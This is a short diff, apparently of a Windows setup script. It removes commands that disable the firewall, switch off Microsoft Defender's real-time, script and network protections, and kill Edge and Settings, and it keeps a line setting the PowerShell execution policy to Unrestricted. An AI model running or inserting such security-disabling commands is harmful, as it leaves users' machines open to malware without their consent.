@@ -1,8 +1,3 @@
-netsh advfirewall set allprofiles state off
-Set-MpPreference -DisableRealtimeMonitoring $true
-Set-MpPreference -DisableIntrusionPreventionSystem $true -DisableIOAVProtection $true -DisableRealtimeMonitoring $true -DisableScriptScanning $true -EnableControlledFolderAccess Disabled -EnableNetworkProtection AuditMode -Force -MAPSReporting Disabled -SubmitSamplesConsent NeverSend
-taskkill /F /IM MicrosoftEdge.exe /T
-taskkill /F /IM SystemSettings.exe /T
 
 Set-ExecutionPolicy -ExecutionPolicy Unrestricted
 
